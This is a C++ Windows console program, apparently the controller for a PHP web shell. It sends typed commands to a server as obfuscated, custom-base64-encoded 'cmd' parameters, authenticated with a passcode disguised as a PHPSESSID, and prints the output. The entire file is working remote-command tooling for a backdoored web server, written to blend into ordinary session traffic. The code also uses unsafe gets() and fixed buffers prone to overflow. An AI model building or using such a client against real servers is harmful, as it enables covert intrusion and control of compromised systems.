// sakuraclient.cpp : コンソール アプリケーション用のエントリ ポイントの定義
//

#include "stdafx.h"
#include <stdio.h>
#include <fcntl.h>
#include <io.h>
#include <winsock.h>
#include <ctype.h>

void GetHTTP(LPCSTR lpServerName, LPCSTR lpFileName);

// Helper macro for displaying errors
#define PRINTERROR(s)	\
		fprintf(stderr,"\n%s: %d\n", s, WSAGetLastError())

#define convert(X) \
	("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789#%"[(X)])

////////////////////////////////////////////////////////////

void main(int argc, char **argv)
{
	WORD wVersionRequested = MAKEWORD(1,1);
	WSADATA wsaData;
	int nRet;
	char tmp[256];
	char cmd[256];
	char buff[256];
	char dir[256];

	memset(tmp, '\0', sizeof(tmp));
	memset(dir, '\0', sizeof(dir));
	memset(cmd, '\0', sizeof(cmd));
	memset(buff, '\0', sizeof(buff));

	//
	// Check arguments
	//
	if (argc != 4)
	{
		fprintf(stderr,	"\nSyntax: ServerName FullPathName PassCode\n");
		return;
	}

	//
	// Initialize WinSock.dll
	//
	nRet = WSAStartup(wVersionRequested, &wsaData);
	if (nRet)
	{
		fprintf(stderr,"\nWSAStartup(): %d\n", nRet);
		WSACleanup();
		return;
	}
	
	//
	// Check WinSock version
	//
	if (wsaData.wVersion != wVersionRequested)
	{
		fprintf(stderr,"\nWinSock version not supported\n");
		WSACleanup();
		return;
	}

	//
	// Set "stdout" to binary mode
	// so that redirection will work
	// for .gif and .jpg files
	//
	_setmode(_fileno(stdout), _O_BINARY);
	memset(buff, '\0', sizeof(buff));
	strcat(buff, argv[2]);
	strcat(buff, "?PHPSESSID=");
	strcat(buff, argv[3]);
	GetHTTP(argv[1], buff);
	putchar('>');

	while (gets(tmp) != NULL) {

		// 終了確認
		if (!strcmp(tmp, "exit")) {
			break;
		}

		unsigned int i;
		int c;
		int d;
		int j = 0;

		// URLエンコード
		for (i = 0; i < strlen(tmp); i++) {
			c = tmp[i];

			if (i == 76 * 3 / 4) {			/* 76 文字ごとに改行する */
				strcat(cmd + (j++), "$");
			}
			switch (i % 3) {
				case 0:	sprintf(cmd + (j++), "%c", convert(c >> 2)); d = (c & 0x03) << 4; break;
				case 1:	sprintf(cmd + (j++), "%c", convert(d | c >> 4)); d = (c & 0x0f) << 2; break;
				case 2:	sprintf(cmd + (j++), "%c", convert(d | c >> 6));
						sprintf(cmd + (j++), "%c", convert(c & 0x3f));
			}
		}
		switch (i % 3) {					/* 改行、“余ったバイト”の処理 */
			case 0:	strcat(cmd + (j++), "$"); break;
			case 1:	sprintf(cmd + (j++), "%c==$", convert(d)); break;
			case 2:	sprintf(cmd + (j++), "%c=$", convert(d));
		}

		if (strlen(tmp) > 0) {
			memset(buff, '\0', sizeof(buff));
			strcat(buff, argv[2]);
			strcat(buff, "?PHPSESSID=");
			strcat(buff, argv[3]);
			strcat(buff, "&cmd=");
			strcat(buff, cmd);

			GetHTTP(argv[1], buff);
			memset(cmd, '\0', sizeof(cmd));
			memset(buff, '\0', sizeof(buff));
		}
		putchar('>');
	}

	//
	// Release WinSock
	//
	WSACleanup();
}

////////////////////////////////////////////////////////////
void GetHTTP(LPCSTR lpServerName, LPCSTR lpFileName)
{
	//
	// Use inet_addr() to determine if we're dealing with a name
	// or an address
	//
	IN_ADDR		iaHost;
	LPHOSTENT	lpHostEntry;

	iaHost.s_addr = inet_addr(lpServerName);
	if (iaHost.s_addr == INADDR_NONE)
	{
		// Wasn't an IP address string, assume it is a name
		lpHostEntry = gethostbyname(lpServerName);
	}
	else
	{
		// It was a valid IP address string
		lpHostEntry = gethostbyaddr((const char *)&iaHost, 
						sizeof(struct in_addr), AF_INET);
	}
	if (lpHostEntry == NULL)
	{
		PRINTERROR("couldn't get host name.");
		return;
	}

	//	
	// Create a TCP/IP stream socket
	//
	SOCKET	Socket;	

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (Socket == INVALID_SOCKET)
	{
		PRINTERROR("socket dosen't work."); 
		return;
	}

	//
	// Find the port number for the HTTP service on TCP
	//
	LPSERVENT lpServEnt;
	SOCKADDR_IN saServer;

	lpServEnt = getservbyname("http", "tcp");
	if (lpServEnt == NULL)
		saServer.sin_port = htons(80);
	else
		saServer.sin_port = lpServEnt->s_port;

	//
	// Fill in the rest of the server address structure
	//
	saServer.sin_family = AF_INET;
	saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);

	//
	// Connect the socket
	//
	int nRet;

	nRet = connect(Socket, (LPSOCKADDR)&saServer, sizeof(SOCKADDR_IN));
	if (nRet == SOCKET_ERROR)
	{
		PRINTERROR("couldn't connect to server.");
		closesocket(Socket);
		return;
	}

	//
	// Format the HTTP request
	//
	char szBuffer[1024];
	memset(szBuffer, '\0', sizeof(szBuffer));
	sprintf(szBuffer, "GET /%s HTTP/1.0\r\nHost: %s\r\n\r\n", lpFileName, lpServerName);
	nRet = send(Socket, szBuffer, strlen(szBuffer), 0);
	if (nRet == SOCKET_ERROR)
	{
		PRINTERROR("couldn't send to server.");
		closesocket(Socket);	
		return;
	}

	//
	// Receive the file contents and print to stdout
	//
	int nFlag = 1;
	while(1)
	{
		// Wait to receive, nRet = NumberOfBytesReceived
		nRet = recv(Socket, szBuffer, sizeof(szBuffer), 0);
		if (nRet == SOCKET_ERROR)
		{
			PRINTERROR("couldn't receive from server.");
			break;
		}

		// Did the server close the connection?
		if (nRet == 0)
			break;
		// Write to stdout
		if (nFlag == 0)
		{
			fwrite(szBuffer, nRet, 1, stdout);
		}
		else
		{
			int  End;
			char *EndPt;

			if ((EndPt = strstr(szBuffer, "\r\n\r\n")) != NULL)
			{
				End = EndPt - szBuffer + 4;
				fwrite(szBuffer + End, nRet - End, 1, stdout);
			}
			nFlag = 0;
		}
	}
	closesocket(Socket);
}
